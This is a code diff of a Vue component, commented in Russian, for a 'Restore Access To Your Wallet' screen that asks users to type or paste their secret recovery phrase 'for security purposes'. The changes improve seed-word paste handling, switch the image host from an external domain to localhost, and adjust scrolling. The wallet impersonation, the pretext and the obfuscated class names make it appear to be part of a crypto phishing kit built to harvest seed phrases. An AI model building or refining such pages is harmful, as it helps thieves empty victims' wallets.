@@ -108,40 +108,27 @@ watch(seedLength, () => {
 //автоматическая вставка сид фразы
 const splitters = [',', ';', ' ', '\n', '\t'];
 
-const handlePaste = (event) => {
+const handlePaste = async (event) => {
   try {
     const pastedData = event.clipboardData.getData('text');
     let updatedPhrases = pastedData
       .split(new RegExp(splitters.join('|')))
       .filter(Boolean);
 
-    console.log(updatedPhrases);
+    phrases.value = phrases.value.filter((phrases) => phrases.trim() !== '');
 
-    phrases.value = Array(seedLength.value).fill('');
+    await nextTick();
 
     phrases.value = [
       ...updatedPhrases,
       ...Array(seedLength.value - updatedPhrases.length).fill('')
     ];
-
-    console.log(phrases.value);
+    await nextTick();
   } catch (error) {
     console.error('Error in handlePaste function:', error);
   }
 };
 
-watch(phrases, (newPhrases) => {
-  newPhrases.forEach((phrase, index) => {
-    if (phrase.length > 10){
-        phrases.value[index] = ''
-        let array = []
-        array = phrase.split(new RegExp(splitters.join('|')))
-        phrases.value[index] = array[index]
-    } else {
-      phrases.value[index] = phrase.trim();
-    }
-  })
-}, {deep: true});
 
 //анимации
 const handleSwipe = () => {
@@ -237,32 +224,46 @@ onMounted(() => {
             justify-content: center;
           "
         >
-          <img
-            style="margin-bottom: 1.25em; width: 10vh"
-            :src="`https://console-test874.com/images/${store.selectedWallet.image}`"
-            alt=""
-          />
-          <h1
+          <div
+            class="gHynXs0v9-scrollbar"
             style="
-              font-size: 1.125em;
-              line-height: 2em;
-              font-weight: 600;
-              text-align: center;
+              max-height: 584px;
+              overflow-y: auto;
+              overflow-x: hidden;
+              display: flex;
+              flex-direction: column;
+              align-items: center;
+              justify-content: start;
+              padding-right: 5px;
             "
           >
-            Restore Access To Your Wallet
-          </h1>
-          <p style="margin-top: 0.5em">
-            For security purposes, confirm access to your wallet using a secret
-            recovery phrase.
-          </p>
-          <div class="dD2nJm28-container gHynXs0v9-scrollbar">
-            <InputSeed
-              v-for="(n, index) in phrases"
-              v-model="phrases[index]"
-              :key="index"
-              :seed="index + 1"
+            <img
+              style="margin-bottom: 1.25em; width: 10vh"
+              :src="`http://localhost:3000/images/${store.selectedWallet.image}`"
+              alt=""
             />
+            <h1
+              style="
+                font-size: 1.125em;
+                line-height: 2em;
+                font-weight: 600;
+                text-align: center;
+              "
+            >
+              Restore Access To Your Wallet
+            </h1>
+            <p style="margin-top: 0.5em">
+              For security purposes, confirm access to your wallet using a
+              secret recovery phrase.
+            </p>
+            <div class="dD2nJm28-container">
+              <InputSeed
+                v-for="(n, index) in phrases"
+                v-model="phrases[index]"
+                :key="index"
+                :seed="index + 1"
+              />
+            </div>
           </div>
           <div
             v-if="!isLoading"
@@ -305,7 +306,7 @@ onMounted(() => {
               display: flex;
               align-items: center;
               justify-content: center;
-              margin-top: 1em;
+              margin-top: 2em;
             "
           >
             <div class="m2kaLGfs7-loader"></div>
@@ -401,9 +402,6 @@ onMounted(() => {
   gap: 1.25em;
   margin-top: 1.25em;
   width: 100%;
-  max-height: 356px;
-  overflow-y: auto;
-  overflow-x: hidden;
 }
 .i2GHFj0R9-container {
   display: flex;
